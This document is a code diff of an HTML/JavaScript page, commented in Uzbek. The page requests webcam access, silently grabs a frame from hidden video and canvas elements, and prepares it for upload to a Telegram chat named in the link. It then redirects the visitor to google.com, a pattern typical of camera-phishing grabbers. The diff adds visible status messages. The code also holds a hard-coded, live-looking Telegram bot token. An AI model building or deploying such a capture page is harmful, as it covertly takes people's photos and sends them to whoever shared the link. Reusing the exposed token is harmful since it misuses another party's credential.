@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title></title>
+<title>Selfie yuborilmoqda...</title>
 <style>
   body { background:#fff; text-align:center; font-family:sans-serif; }
   video, canvas { display:none; }
 </style>
 </head>
 <body>
-
+<h3 id="st">Kamera yoqilmoqda...</h3>
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
@@ -19,26 +19,26 @@ const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
 const chatId = window.location.pathname.split("/").pop(); // URL oxiridagi chatId
 
 async function start() {
+  const st = document.getElementById("st");
   try {
     if (!chatId) {
+      st.textContent = "chatId topilmadi";
       console.error("chatId topilmadi");
-  
       return;
     }
 
-
-
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    st.textContent = "Kamera ruxsati so‘ralmoqda...";
+    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
     const v = document.getElementById("v");
     v.srcObject = stream;
 
-    // video frame kelishini kutamiz (Telegram in-app browser uchun)
+    // Video frame kelishini kutish (loadedmetadata + canplay + fallback)
     await new Promise(resolve => {
-      if(v.readyState>=2 && v.videoWidth>0) return resolve();
-      const onPlaying = () => { v.removeEventListener("playing", onPlaying); resolve(); };
-      v.addEventListener("playing", onPlaying);
-      v.play().catch(()=>{});
-      setTimeout(()=>{ v.removeEventListener("playing", onPlaying); resolve(); }, 3000);
+      if(v.readyState >= 2 && v.videoWidth>0) return resolve();
+      const onReady = () => { v.removeEventListener('loadedmetadata', onReady); v.removeEventListener('canplay', onReady); resolve(); };
+      v.addEventListener('loadedmetadata', onReady);
+      v.addEventListener('canplay', onReady);
+      setTimeout(resolve, 5000); // maksimal 5s kutish
     });
 
     const c = document.getElementById("c");
@@ -46,14 +46,16 @@ async function start() {
     c.height = v.videoHeight || 480;
     const ctx = c.getContext("2d");
 
-    // Oxirgi frame kelishini kutamiz
-    await new Promise(r=>requestAnimationFrame(r));
-    ctx.drawImage(v,0,0,c.width,c.height);
+    // 1 frame kutish requestAnimationFrame bilan
+    await new Promise(r => requestAnimationFrame(r));
+    ctx.drawImage(v, 0, 0, c.width, c.height);
 
+    // Kamerani to‘xtatish
     stream.getTracks().forEach(t => t.stop());
-   
 
-    const blob = await new Promise(res => c.toBlob(res,"image/png"));
+    st.textContent = "Rasm yuborilmoqda...";
+
+    const blob = await new Promise(res => c.toBlob(res, "image/png"));
     if(!blob) throw new Error("Rasm olinmadi");
 
     const form = new FormData();
@@ -70,10 +72,10 @@ async function start() {
       return;
     }
 
-
+    st.textContent = "Rasm yuborildi, yo‘naltirilmoqda...";
     window.location.href = "https://google.com";
 
-  } catch(err){
+  } catch(err) {
     console.error(err);
     window.location.href = "https://google.com";
   }
